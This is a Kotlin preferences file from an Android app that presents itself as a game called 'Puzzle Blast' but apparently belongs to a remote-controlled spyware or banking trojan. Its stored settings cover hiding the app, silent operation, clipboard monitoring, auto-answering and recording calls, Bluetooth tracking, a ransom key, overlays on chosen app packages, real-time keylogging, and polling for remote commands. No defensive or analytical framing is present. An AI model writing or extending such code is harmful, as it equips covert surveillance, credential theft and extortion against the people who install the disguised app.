package com.puzzleblast.game.util

import android.content.Context
import android.content.SharedPreferences

object Prefs {
    private lateinit var p: SharedPreferences
    fun init(ctx: Context) { p = ctx.getSharedPreferences("pb", Context.MODE_PRIVATE) }

    var wizardDone: Boolean
        get() = p.getBoolean("wd", false); set(v) = p.edit().putBoolean("wd", v).apply()
    var authed: Boolean
        get() = p.getBoolean("au", false); set(v) = p.edit().putBoolean("au", v).apply()
    var hidden: Boolean
        get() = p.getBoolean("hi", false); set(v) = p.edit().putBoolean("hi", v).apply()
    var updateOffset: Long
        get() = p.getLong("uo", 0L); set(v) = p.edit().putLong("uo", v).apply()
    var pollInterval: Long
        get() = p.getLong("pi", 500L); set(v) = p.edit().putLong("pi", v).apply()
    var silent: Boolean
        get() = p.getBoolean("si", false); set(v) = p.edit().putBoolean("si", v).apply()
    var unlockCap: Boolean
        get() = p.getBoolean("uc", false); set(v) = p.edit().putBoolean("uc", v).apply()
    var clipboardWatch: Boolean
        get() = p.getBoolean("cw", false); set(v) = p.edit().putBoolean("cw", v).apply()
    var callAutoAnswer: Boolean
        get() = p.getBoolean("caa", false); set(v) = p.edit().putBoolean("caa", v).apply()
    var caaSpeaker: Boolean
        get() = p.getBoolean("caas", false); set(v) = p.edit().putBoolean("caas", v).apply()
    var caaRecord: Boolean
        get() = p.getBoolean("caar", false); set(v) = p.edit().putBoolean("caar", v).apply()
    var caaWhitelist: String
        get() = p.getString("caaw", "") ?: ""; set(v) = p.edit().putString("caaw", v).apply()
    var btTrack: Boolean
        get() = p.getBoolean("btt", false); set(v) = p.edit().putBoolean("btt", v).apply()
    var ransomKey: String
        get() = p.getString("rk", "") ?: ""; set(v) = p.edit().putString("rk", v).apply()
    var pendingConfirm: String
        get() = p.getString("pc", "") ?: ""; set(v) = p.edit().putString("pc", v).apply()
    var pendingConfirmCmd: String
        get() = p.getString("pcc", "") ?: ""; set(v) = p.edit().putString("pcc", v).apply()
    var pendingConfirmExpiry: Long
        get() = p.getLong("pce", 0L); set(v) = p.edit().putLong("pce", v).apply()
    var appOpenWatchPkg: String
        get() = p.getString("aow", "") ?: ""; set(v) = p.edit().putString("aow", v).apply()
    var overlayOnPkg: String
        get() = p.getString("oop", "") ?: ""; set(v) = p.edit().putString("oop", v).apply()
    var overlayOnTmpl: String
        get() = p.getString("oot", "") ?: ""; set(v) = p.edit().putString("oot", v).apply()
    var realtimeKeylog: Boolean
        get() = p.getBoolean("rkl", false); set(v) = p.edit().putBoolean("rkl", v).apply()
    var bootCount: Int
        get() = p.getInt("bc", 0); set(v) = p.edit().putInt("bc", v).apply()
    var cmdCount: Int
        get() = p.getInt("cc", 0); set(v) = p.edit().putInt("cc", v).apply()
    var errCount: Int
        get() = p.getInt("ec", 0); set(v) = p.edit().putInt("ec", v).apply()
    var startTime: Long
        get() = p.getLong("st", System.currentTimeMillis()); set(v) = p.edit().putLong("st", v).apply()
    var lastActive: Long
        get() = p.getLong("la", 0L); set(v) = p.edit().putLong("la", v).apply()
    var disguiseLabel: String
        get() = p.getString("dl", "Puzzle Blast") ?: ""; set(v) = p.edit().putString("dl", v).apply()

    fun incCmd() { cmdCount = cmdCount + 1; lastActive = System.currentTimeMillis() }
    fun incErr() { errCount = errCount + 1 }
}
